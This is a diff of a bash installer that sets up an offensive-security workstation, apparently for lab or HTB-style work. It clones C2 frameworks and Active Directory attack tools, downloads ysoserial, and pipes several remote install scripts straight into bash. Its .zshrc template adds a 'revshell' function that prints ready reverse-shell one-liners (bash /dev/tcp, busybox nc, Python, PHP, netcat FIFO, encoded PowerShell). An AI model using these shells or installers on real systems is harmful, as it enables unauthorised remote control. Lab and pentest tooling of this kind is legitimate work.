@@ -64,9 +64,18 @@ REPOS=(
   "https://github.com/HavocFramework/Havoc.git"
   "https://github.com/Greenwolf/ntlm_theft.git"
   "https://github.com/Adaptix-Framework/AdaptixC2.git"
+  "https://github.com/itm4n/PrivescCheck.git"
+  "https://github.com/diego-treitos/linux-smart-enumeration.git"
+  "https://github.com/ShutdownRepo/targetedKerberoast.git"
+  "https://github.com/Leo4j/Invoke-ADEnum.git"
+  "https://github.com/lefayjey/linWinPwn.git"
+  "https://github.com/gitleaks/gitleaks.git"
+  "https://github.com/semgrep/semgrep-rules.git"
+  "https://github.com/nullsection/chisel-ng.git"
+  "https://github.com/strayge/pylnk.git"
 )
 
-APT_PACKAGES=(curl wget gcc make build-essential golang-go python3 python3-pip python3-venv pipx parallel jq unzip git docker.io docker-compose cargo ligolo-mp )
+APT_PACKAGES=(curl wget gcc make build-essential fzf golang-go python3 python3-pip python3-venv pipx parallel jq unzip git docker.io docker-compose cargo zsh tmux ligolo-mp lsd)
 
 # ========== Utilities ==========
 repo_name_from_url() {
@@ -95,7 +104,7 @@ check_dependencies() {
   for pkg in "${APT_PACKAGES[@]}"; do
     case "$pkg" in
       docker-compose)
-        if ! command -v docker-compose &>/dev/null && ! docker compose version &>/dev/null; then
+        if ! command -v docker-compose &>/dev/null && ! docker compose version &>/dev/null 2>&1; then
           missing+=("$pkg")
         fi
         ;;
@@ -105,7 +114,7 @@ check_dependencies() {
         fi
         ;;
       *)
-        if ! command -v "${pkg%%-*}" &>/dev/null && ! dpkg -s "$pkg" &>/dev/null 2>/dev/null; then
+        if ! command -v "${pkg%%-*}" &>/dev/null && ! dpkg -s "$pkg" &>/dev/null 2>&1; then
           missing+=("$pkg")
         fi
         ;;
@@ -153,14 +162,21 @@ install_git_repos() {
 
     if [ -d "$target/.git" ]; then
       info "Updating $name..."
-      if ! git -C "$target" pull --ff-only --rebase; then
-        warn "git pull failed for $name — attempting a safe fetch"
+      # Check for uncommitted changes
+      if ! git -C "$target" diff-index --quiet HEAD -- 2>/dev/null; then
+        warn "$name has uncommitted changes. Skipping update."
+        continue
+      fi
+      
+      if git -C "$target" pull --ff-only --quiet 2>/dev/null; then
+        success "Updated $name"
+      else
+        warn "git pull failed for $name — attempting fetch"
         git -C "$target" fetch --all --prune || warn "fetch failed for $name"
       fi
-      success "Updated $name"
     else
       info "Cloning $name → $target"
-      if git clone --depth 1 "$repo" "$target"; then
+      if git clone --depth 1 --quiet "$repo" "$target" 2>/dev/null; then
         success "Cloned $name"
       else
         warn "Clone failed for $repo. Skipping."
@@ -168,7 +184,7 @@ install_git_repos() {
       fi
     fi
 
-    chmod -R u+rwX,go+rX,go-w "$target" || true
+    chmod -R u+rwX,go+rX,go-w "$target" 2>/dev/null || true
   done
 }
 
@@ -203,11 +219,12 @@ install_go_tools() {
   )
 
   for tool in "${go_tools[@]}"; do
-    step "go install $tool"
-    if ! go install "$tool"; then
-      warn "go install failed for $tool — continuing"
+    local tool_name=$(basename "$tool" | cut -d@ -f1)
+    step "Installing $tool_name..."
+    if go install "$tool" 2>/dev/null; then
+      success "Installed $tool_name"
     else
-      success "Installed $(basename "$tool" | cut -d@ -f1)"
+      warn "go install failed for $tool — continuing"
     fi
   done
 }
@@ -221,21 +238,30 @@ install_python_tools() {
 
   info "Installing Python tools via pipx..."
   local py_tools=(
+    "git+https://github.com/AD-Security/AD_Miner.git"
     "git+https://github.com/dwisiswant0/apkleaks.git"
     "git+https://github.com/s0md3v/Arjun.git"
     "git+https://github.com/s0md3v/uro.git"
     "git+https://github.com/sherlock-project/sherlock.git"
     "git+https://github.com/brightio/penelope.git"
     "git+https://github.com/freelabz/secator.git"
+    "git+https://github.com/CravateRouge/bloodyAD.git"
+    "git+https://github.com/CravateRouge/autobloody.git"
+    "git+https://github.com/Maxteabag/sqlit.git"
+    "git+https://github.com/p0dalirius/Coercer.git"
+    "git+https://github.com/blacklanternsecurity/baddns"
+    "git+https://github.com/ShutdownRepo/pywhisker.git"
+    "git+https://github.com/aniqfakhrul/powerview.py.git"
   )
 
   for pkg in "${py_tools[@]}"; do
-    step "pipx install $pkg"
-    if ! pipx install --force "$pkg"; then
-      warn "pipx install failed for $pkg; attempting pipx install without --force"
-      pipx install "$pkg" || warn "pipx still failed for $pkg"
+    local pkg_name=$(basename "$pkg" .git)
+    step "Installing $pkg_name..."
+    if pipx install --force "$pkg" &>/dev/null; then
+      success "Installed $pkg_name"
     else
-      success "Installed $(basename "$pkg")"
+      warn "pipx install failed for $pkg_name"
+      pipx install "$pkg" 2>/dev/null || warn "pipx still failed for $pkg_name"
     fi
   done
 }
@@ -246,7 +272,7 @@ exploitdb() {
   step "Installing/updating go-exploitdb in $repo_path"
   mkdir -p "$(dirname "$repo_path")"
   if [ ! -d "$repo_path" ]; then
-    if git clone https://github.com/vulsio/go-exploitdb.git "$repo_path"; then
+    if git clone --quiet https://github.com/vulsio/go-exploitdb.git "$repo_path" 2>/dev/null; then
       success "Cloned go-exploitdb"
     else
       warn "Failed to clone go-exploitdb"
@@ -254,15 +280,16 @@ exploitdb() {
     fi
   else
     info "Updating go-exploitdb"
-    git -C "$repo_path" pull || warn "Failed to update go-exploitdb"
+    git -C "$repo_path" pull --quiet 2>/dev/null || warn "Failed to update go-exploitdb"
   fi
 
   cd "$repo_path" || return 1
-  if make install; then
+  if make install &>/dev/null; then
     success "go-exploitdb installed"
   else
     warn "make install failed for go-exploitdb"
   fi
+  cd - >/dev/null || true
 }
 
 # ========== BloodHound CLI (optional) ==========
@@ -274,11 +301,17 @@ install_bloodhound() {
 
   info "Installing BloodHound CLI (if available)"
   local tmp="/tmp/bloodhound-cli-linux-amd64.tar.gz"
-  if wget -q -O "$tmp" "https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz"; then
-    sudo tar -xvzf "$tmp" -C /usr/local/bin/ || warn "tar extraction warning"
-    sudo chmod +x /usr/local/bin/bloodhound-cli || true
-    sudo usermod -aG docker $USER || true
+  if wget -q -O "$tmp" "https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz" 2>/dev/null; then
+    sudo tar -xzf "$tmp" -C /usr/local/bin/ 2>/dev/null || warn "tar extraction warning"
+    sudo chmod +x /usr/local/bin/bloodhound-cli 2>/dev/null || true
+    
+    # Only add to docker group if docker exists
+    if command -v docker &>/dev/null; then
+      sudo usermod -aG docker "$USER" 2>/dev/null || true
+    fi
+    
     success "BloodHound CLI binary installed to /usr/local/bin/"
+    rm -f "$tmp"
   else
     warn "Could not download BloodHound CLI release (maybe no internet or release missing)."
   fi
@@ -287,13 +320,102 @@ install_bloodhound() {
 install_ronin() {
   info "Attempting Ronin install via upstream script"
   if command -v curl &>/dev/null; then
-    if curl -sSL "https://raw.githubusercontent.com/ronin-rb/scripts/main/ronin-install.sh" | bash; then
+    if curl -sSL "https://raw.githubusercontent.com/ronin-rb/scripts/main/ronin-install.sh" 2>/dev/null | bash; then
       success "Ronin installed"
     else
       warn "Ronin install script failed"
     fi
   else
     warn "curl not present; cannot install Ronin automatically."
+  fi
+}
+
+install_java_8() {
+  info "Attempting Java 8 install via upstream script"
+  if command -v curl &>/dev/null; then
+    if curl -o /tmp/openjdk-8u44-linux-x64.tar.gz -sSL "https://download.java.net/openjdk/jdk8u44/ri/openjdk-8u44-linux-x64.tar.gz" 2>/dev/null && tar -xzf /tmp/openjdk-8u44-linux-x64.tar.gz -C /tmp/ 2>/dev/null; then
+      tar -xzf /tmp/openjdk-8u44-linux-x64.tar.gz -C /tmp/ 2>/dev/null || warn "Java tar extraction warning"
+      sudo mv /tmp/java-se-8u44-ri /usr/lib/jvm/java-se-8 2>/dev/null || warn "Java mv warning"
+      sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/java-se-8/bin/java 1 2>/dev/null || warn "update-alternatives warning"
+      sudo update-alternatives --set java /usr/lib/jvm/java-se-8/bin/java 2>/dev/null || warn "update-alternatives set warning"
+      sudo update-alternatives --auto java 2>/dev/null || warn "update-alternatives auto warning"
+      success "Java 8 installed"
+    else
+      warn "Java 8 install script failed"
+    fi
+  else
+    warn "curl not present; cannot install Java 8 automatically."
+  fi
+}
+
+
+install_ysoserial_jar() {
+  info "Attempting ysoserial-jar install via upstream script"
+  if command -v curl &>/dev/null; then
+    if curl -o "$DEST_DIR/ysoserial-all.jar" -sSL "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar" 2>/dev/null; then
+      success "ysoserial-jar installed"
+    else
+      warn "ysoserial-jar install script failed"
+    fi
+  else
+    warn "curl not present; cannot install ysoserial-jar automatically."
+  fi
+}
+
+install_ysoserial_net() {
+  info "Attempting ysoserial-net install via upstream script"
+  if command -v curl &>/dev/null; then
+    if curl -o "$DEST_DIR/ysoserial-net.zip" -sSL "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip" 2>/dev/null; then
+      unzip -oq "$DEST_DIR/ysoserial-net.zip" -d "$DEST_DIR/ysoserial-net" 2>/dev/null || warn "ysoserial-net unzip warning"
+      mv $DEST_DIR/ysoserial-net/Release/* $DEST_DIR/ysoserial-net/ 2>/dev/null || true
+      rm -rf "$DEST_DIR/ysoserial-net/Release"
+      rm -f "$DEST_DIR/ysoserial-net.zip"
+      success "ysoserial-net installed"
+    else
+      warn "ysoserial-net install script failed"
+    fi
+  else
+    warn "curl not present; cannot install ysoserial-net automatically."
+  fi
+}
+
+install_opengrep() {
+  info "Attempting opengrep install via upstream script"
+  if command -v curl &>/dev/null; then
+    if curl -fsSL https://raw.githubusercontent.com/opengrep/opengrep/main/install.sh 2>/dev/null | bash; then
+      success "Opengrep installed"
+    else
+      warn "Opengrep install script failed"
+    fi
+  else
+    warn "curl not present; cannot install Opengrep automatically."
+  fi
+}
+
+
+install_witr() {
+  info "Attempting Witr install via upstream script"
+  if command -v curl &>/dev/null; then
+    if curl -sSL "https://raw.githubusercontent.com/pranshuparmar/witr/main/install.sh " 2>/dev/null | bash; then
+      success "Witr installed"
+    else
+      warn "Witr install script failed"
+    fi
+  else
+    warn "curl not present; cannot install Witr automatically."
+  fi
+}
+
+install_spf() {
+  info "Attempting SPF install via upstream script"
+  if command -v curl &>/dev/null; then
+    if curl -sLo- https://superfile.dev/install.sh 2>/dev/null | bash; then
+      success "SPF installed"
+    else
+      warn "SPF install script failed"
+    fi
+  else
+    warn "curl not present; cannot install SPF automatically."
   fi
 }
 
@@ -317,11 +439,12 @@ font_packages_install() {
 
   if command -v wget &>/dev/null; then
     step "Downloading Hack Nerd Font..."
-    if wget -q -O "$tmp" "$url"; then
+    if wget -q -O "$tmp" "$url" 2>/dev/null; then
       step "Extracting fonts to $font_dir..."
-      unzip -oq "$tmp" -d "$font_dir" || warn "Font extraction warning"
-      fc-cache -fv >/dev/null 2>&1
+      unzip -oq "$tmp" -d "$font_dir" 2>/dev/null || warn "Font extraction warning"
+      fc-cache -fv >/dev/null 2>&1 || true
       success "Hack Nerd Font installed successfully."
+      rm -f "$tmp"
     else
       error "Failed to download font from $url"
       return 1
@@ -330,8 +453,6 @@ font_packages_install() {
     error "wget not found. Please install wget or curl before running this."
     return 1
   fi
-
-  rm -f "$tmp"
 }
 
 # ========== NEW: Oh My Zsh + tmux + zshrc installer ==========
@@ -346,22 +467,33 @@ install_oh_my_zsh() {
     return 0
   fi
 
+  if ! command -v zsh &>/dev/null; then
+    warn "zsh not installed. Installing via apt..."
+    sudo apt update -y && sudo apt install -y zsh || {
+      error "Failed to install zsh"
+      return 1
+    }
+  fi
+
   step "Installing oh-my-zsh (non-interactive)"
   export RUNZSH="no" CHSH="no"
   if command -v curl &>/dev/null; then
-    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" || {
+    sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended 2>/dev/null || {
       warn "oh-my-zsh install script failed"
       return 1
     }
   else
-    sh -c "$(wget -qO- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" || {
+    sh -c "$(wget -qO- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended 2>/dev/null || {
       warn "oh-my-zsh install script failed"
       return 1
     }
   fi
-  git clone https://github.com/zsh-users/zsh-autosuggestions.git ${HOME}/.oh-my-zsh/plugins/zsh-autosuggestions || warn "zsh-autosuggestions install failed"
-  git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${HOME}/.oh-my-zsh/plugins/zsh-syntax-highlighting || warn "zsh-syntax-highlighting install failed"
-  curl -o ${HOME}/.oh-my-zsh/themes/parrot.zsh-theme -fsSL https://raw.githubusercontent.com/trabdlkarim/parrot-zsh-theme/refs/heads/main/parrot.zsh-theme || warn "parrot theme install failed"
+  
+  # Install plugins
+  git clone --quiet https://github.com/zsh-users/zsh-autosuggestions.git "${HOME}/.oh-my-zsh/custom/plugins/zsh-autosuggestions" 2>/dev/null || warn "zsh-autosuggestions install failed"
+  git clone --quiet https://github.com/zsh-users/zsh-syntax-highlighting.git "${HOME}/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting" 2>/dev/null || warn "zsh-syntax-highlighting install failed"
+  curl -o "${HOME}/.oh-my-zsh/custom/themes/parrot.zsh-theme" -fsSL https://raw.githubusercontent.com/trabdlkarim/parrot-zsh-theme/refs/heads/main/parrot.zsh-theme 2>/dev/null || warn "parrot theme install failed"
+  
   success "oh-my-zsh installed (RUNZSH=no CHSH=no)."
 }
 
@@ -371,24 +503,24 @@ install_tmux_conf() {
     return 0
   fi
 
-  if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
-    warn "curl/wget missing; cannot install tmux config automatically."
+  if ! command -v tmux &>/dev/null; then
+    warn "tmux not installed. Install it first."
+    return 0
+  fi
+
+  if ! command -v git &>/dev/null; then
+    warn "git missing; cannot install tmux config automatically."
     return 0
   fi
 
   step "Installing gpakosz/.tmux config"
-  # use a timestamped fragment as you requested (the fragment is ignored by curl/wget, it's just what you provided)
-  if command -v curl &>/dev/null; then
-    curl -fsSL "https://github.com/gpakosz/.tmux/raw/refs/heads/master/install.sh#$(date +%s)" | bash || {
-      warn "tmux install script failed"
-      return 1
-    }
-  else
-    wget -qO- "https://github.com/gpakosz/.tmux/raw/refs/heads/master/install.sh#$(date +%s)" | bash || {
-      warn "tmux install script failed"
-      return 1
-    }
-  fi
+  cd ~ || return 1
+  git clone --quiet https://github.com/gpakosz/.tmux.git 2>/dev/null || {
+    warn "Failed to clone .tmux repo"
+    return 1
+  }
+  ln -s -f .tmux/.tmux.conf .tmux.conf 2>/dev/null || true
+  cp .tmux/.tmux.conf.local . 2>/dev/null || true
 
   success "tmux config installed (gpakosz)."
 }
@@ -404,181 +536,111 @@ install_zshrc_template() {
 
   step "Writing new ~/.zshrc from template"
   cat > "$zshrc_path" <<'EOF'
-# Enable Powerlevel10k instant prompt. Should stay close to the top of ~/.zshrc.
-# Initialization code that may require console input (password prompts, [y/n]
-# confirmations, etc.) must go above this block; everything else may go below.
-if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
-  source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
-fi
-
-# If you come from bash you might have to change your $PATH.
-# export PATH=$HOME/bin:$HOME/.local/bin:/usr/local/bin:$PATH
-
 # Path to your Oh My Zsh installation.
 export ZSH="$HOME/.oh-my-zsh"
 
-# Set name of the theme to load --- if set to "random", it will
-# load a random theme each time Oh My Zsh is loaded, in which case,
-# to know which specific one was loaded, run: echo $RANDOM_THEME
-# See https://github.com/ohmyzsh/ohmyzsh/wiki/Themes
-#ZSH_THEME="darkblood" #Default theme
-ZSH_THEME="parrot" # Parrot theme from
+# Set name of the theme to load
+ZSH_THEME="parrot"
 
-# Set list of themes to pick from when loading at random
-# Setting this variable when ZSH_THEME=random will cause zsh to load
-# a theme from this variable instead of looking in $ZSH/themes/
-# If set to an empty array, this variable will have no effect.
-# ZSH_THEME_RANDOM_CANDIDATES=( "robbyrussell" "agnoster" )
-
-# Uncomment the following line to use case-sensitive completion.
-# CASE_SENSITIVE="true"
-
-# Uncomment the following line to use hyphen-insensitive completion.
-# Case-sensitive completion must be off. _ and - will be interchangeable.
-# HYPHEN_INSENSITIVE="true"
-
-# Uncomment one of the following lines to change the auto-update behavior
-# zstyle ':omz:update' mode disabled  # disable automatic updates
-# zstyle ':omz:update' mode auto      # update automatically without asking
-# zstyle ':omz:update' mode reminder  # just remind me to update when it's time
-
-# Uncomment the following line to change how often to auto-update (in days).
-# zstyle ':omz:update' frequency 13
-
-# Uncomment the following line if pasting URLs and other text is messed up.
-# DISABLE_MAGIC_FUNCTIONS="true"
-
-# Uncomment the following line to disable colors in ls.
-# DISABLE_LS_COLORS="true"
-
-# Uncomment the following line to disable auto-setting terminal title.
-# DISABLE_AUTO_TITLE="true"
-
-# Uncomment the following line to enable command auto-correction.
-# ENABLE_CORRECTION="true"
-
-# Uncomment the following line to display red dots whilst waiting for completion.
-# You can also set it to another string to have that shown instead of the default red dots.
-# e.g. COMPLETION_WAITING_DOTS="%F{yellow}waiting...%f"
-# Caution: this setting can cause issues with multiline prompts in zsh < 5.7.1 (see #5765)
-# COMPLETION_WAITING_DOTS="true"
-
-# Uncomment the following line if you want to disable marking untracked files
-# under VCS as dirty. This makes repository status check for large repositories
-# much, much faster.
-# DISABLE_UNTRACKED_FILES_DIRTY="true"
-
-# Uncomment the following line if you want to change the command execution time
-# stamp shown in the history command output.
-# You can set one of the optional three formats:
-# "mm/dd/yyyy"|"dd.mm.yyyy"|"yyyy-mm-dd"
-# or set a custom format using the strftime function format specifications,
-# see 'man strftime' for details.
-# HIST_STAMPS="mm/dd/yyyy"
-
-# Would you like to use another custom folder than $ZSH/custom?
-# ZSH_CUSTOM=/path/to/new-custom-folder
-
-# Which plugins would you like to load?
-# Standard plugins can be found in $ZSH/plugins/
-# Custom plugins may be added to $ZSH_CUSTOM/plugins/
-# Example format: plugins=(rails git textmate ruby lighthouse)
-# Add wisely, as too many plugins slow down shell startup.
-plugins=(zsh-autosuggestions zsh-syntax-highlighting)
+# Plugins
+plugins=(zsh-autosuggestions zsh-syntax-highlighting fzf)
 
 source $ZSH/oh-my-zsh.sh
 
 # User configuration
-
-# export MANPATH="/usr/local/man:$MANPATH"
-
-# You may need to manually set your language environment
-# export LANG=en_US.UTF-8
-
-# Preferred editor for local and remote sessions
-# if [[ -n $SSH_CONNECTION ]]; then
-#   export EDITOR='vim'
-# else
-#   export EDITOR='nvim'
-# fi
-
-# Compilation flags
-# export ARCHFLAGS="-arch $(uname -m)"
-
-# Set personal aliases, overriding those provided by Oh My Zsh libs,
-# plugins, and themes. Aliases can be placed here, though Oh My Zsh
-# users are encouraged to define aliases within a top-level file in
-# the $ZSH_CUSTOM folder, with .zsh extension. Examples:
-# - $ZSH_CUSTOM/aliases.zsh
-# - $ZSH_CUSTOM/macos.zsh
-# For a full list of active aliases, run `alias`.
-#
-# Example aliases
-# alias zshconfig="mate ~/.zshrc"
-# alias ohmyzsh="mate ~/.oh-my-zsh"
-#
 export GOPATH="${HOME}/go"
-export PATH="${GOPATH}/bin:${PATH}"
-
+export PATH="${GOPATH}/bin:${PATH}:${HOME}/.local/bin"
 
 # Generated for pdtm. Do not edit.
-export PATH=$PATH:/home/kasemsh/.pdtm/go/bin
+export PATH=$PATH:$HOME/.pdtm/go/bin
 
-# To customize prompt, run `p10k configure` or edit ~/.p10k.zsh.
-[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh
-
-##### add-ons
-#
+##### Custom Aliases and Functions
 alias myip='curl ifconfig.me'
 
+######################### RevShell Function START #################################
 revshell(){ 
   ip=$1; port=$2;
 
-  bash_shell="/usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
+  bash_shell="/usr/bin/bash  -i  >&  /dev/tcp/$ip/$port  0>&1  "
   shell_encode=$(echo "$bash_shell"|base64 -w 0)
   
   
-  ps_cmd="\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+  ps_cmd="\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close() "
 
   ps_base64=$(echo "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
-
-  echo -e "\n[+] Bash: /usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
+  
+  echo -e "\n[+] busybox: busybox nc $ip $port -e sh"
+  echo -e "[+] Java Runtime().exec: bash -c $@|bash 0 echo bash -i >& /dev/tcp/$ip/$port 0>&1 "
+  echo -e "[+] Bash: /usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
   echo -e "[+] Bash Encoded: echo \"$shell_encode\"|base64 -d |/usr/bin/bash"
-  echo "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
-  echo "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
-  echo "[+] Netcat FIFO: rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/bash -i 2>&1|nc $ip $port"
-  echo "[+] PowerShell (Base64): powershell -e $ps_base64"
+  echo -e "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+  echo -e "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
+  echo -e "[+] Netcat FIFO: rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/bash -i 2>&1|nc $ip $port"
+  echo -e "[+] PowerShell (Base64): powershell -e $ps_base64"
 }
 
-
-
+######################### RevShell Function END #################################
+#
+#
+#
+######################### Aliases START #########################
+alias ls='lsd'
+alias l='lsd -l'
+alias la='lsd -a'
+alias lla='lsd -la'
+alias lt='lsd --tree'
+######################### Aliases END ##########################
+#
+#
+#
+######################### Environment variables START ######################## 
 export HTB_TOKEN=""
-export VMIP="10.10.10.0"
-export IP="10.129.234.70"
+export VMIP=""
+export IP=""
+######################### Environment variables END ######################## 
 EOF
 
-  chmod 644 "$zshrc_path" || true
+  chmod 644 "$zshrc_path" 2>/dev/null || true
   success "~/.zshrc written."
 }
 
 # ========== MAIN ==========
 main() {
   info "Starting installer (pretty mode enabled)"
+  echo ""
 
   check_dependencies
+  echo ""
   font_packages_install
+  echo ""
   install_git_repos
+  echo ""
   install_go_tools
+  echo ""
   install_python_tools
+  echo ""
   exploitdb
+  echo ""
   install_bloodhound
+  echo ""
   install_ronin
+  echo ""
+  install_opengrep
+  echo ""
+  install_witr
+  echo ""
+  install_spf
+  echo ""
   install_oh_my_zsh
+  echo ""
   install_tmux_conf
+  echo ""
   install_zshrc_template
+  echo ""
 
   success "All done — repos + tools attempted. Inspect the output for any warnings."
   info "Tips: Run this as a user with sudo privileges. Some installs (docker, go) may need manual follow-up."
+  info "To use zsh as default shell, run: chsh -s \$(which zsh)"
 }
 
 # run when invoked, not when sourced
